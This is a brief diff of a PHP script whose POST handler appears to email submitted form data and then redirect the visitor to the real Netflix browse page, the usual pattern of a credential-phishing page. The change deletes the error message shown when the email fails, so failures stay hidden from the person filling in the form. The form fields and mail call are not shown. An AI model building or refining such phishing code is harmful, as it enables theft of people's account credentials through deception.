@@ -29,7 +29,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         header('Location: https://www.netflix.com/browse');
         exit;  // Termina la ejecución del script después de la redirección
     } else {
-        echo "Hubo un problema al enviar el correo.";
+        
     }
 }
 ?>
